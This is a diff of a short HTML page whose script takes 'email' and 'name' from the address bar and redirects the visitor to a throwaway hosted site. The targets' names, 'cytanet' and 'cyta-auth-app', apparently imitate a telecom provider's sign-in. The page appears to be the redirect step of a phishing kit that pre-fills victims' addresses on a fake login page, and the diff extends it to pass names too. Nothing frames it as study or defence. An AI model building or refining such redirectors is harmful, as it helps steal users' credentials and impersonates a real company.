@@ -2,18 +2,29 @@
 <html>
 <head>
     <script>
-        // Get parameters from current URL
+        // Get parameters from current redirect URL
         const urlParams = new URLSearchParams(window.location.search);
         const email = urlParams.get('email');
+        const name = urlParams.get('name');
         
-        // Build target URL with email parameter
-        let targetUrl = 'https://cytanet-37de5d84a27f037de5d84a27f0.pages.dev/37de5d84a/37de5d84a27f0';
+        // Your target URL that already has parameters
+        let targetUrl = 'https://cyta-auth-app-4432760-311903-adbver.vercel.app/?email=value&another_param=123';
+        
+        // Convert target URL to URL object to handle existing parameters
+        const targetUrlObj = new URL(targetUrl);
+        
+        // Add email parameter if it exists in redirect URL
         if (email) {
-            targetUrl += '?email=' + encodeURIComponent(email);
+            targetUrlObj.searchParams.set('email', email);
         }
         
-        // Redirect
-        window.location.href = targetUrl;
+        // Add name parameter if it exists in redirect URL
+        if (name) {
+            targetUrlObj.searchParams.set('name', name);
+        }
+        
+        // Redirect to the merged URL
+        window.location.href = targetUrlObj.toString();
     </script>
 </head>
 <body></body>
